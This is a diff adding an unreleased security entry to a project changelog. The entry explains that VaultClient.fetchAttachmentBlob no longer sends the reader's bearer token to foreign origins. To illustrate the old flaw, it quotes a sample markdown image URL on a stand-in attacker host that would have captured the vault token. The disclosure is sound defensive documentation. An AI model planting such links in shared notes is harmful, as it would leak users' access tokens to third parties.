@@ -1,5 +1,16 @@
 # Changelog
 
+## Unreleased
+
+### Security — `fetchAttachmentBlob` sends the bearer only to the vault's origin
+
+`VaultClient.fetchAttachmentBlob` used to pass any absolute URL through with
+`Authorization: Bearer <token>`. A note image like
+`![](https://evil.example/api/storage/x.png)` therefore handed that host the
+reader's vault token. An absolute (or protocol-relative) URL is now fetched
+only when it is on the vault's own origin; any other is refused with an error
+before a request is made. Relative and bare storage paths are unchanged.
+
 ## [0.3.7] - 2026-08-30
 
 Stable promotion of `0.3.7-rc.2` — suffix-drop, no code change. See the
